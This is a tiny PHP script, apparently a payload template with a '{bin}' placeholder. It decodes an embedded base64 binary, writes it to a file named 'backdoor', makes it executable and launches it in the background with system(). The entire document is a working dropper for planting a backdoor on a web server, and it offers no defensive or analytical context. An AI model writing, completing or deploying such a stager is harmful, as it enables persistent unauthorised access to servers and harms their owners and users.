<?php
$shell = "{bin}";

file_put_contents("./backdoor", base64_decode($shell));

system("chmod +x ./backdoor ; ./backdoor &");
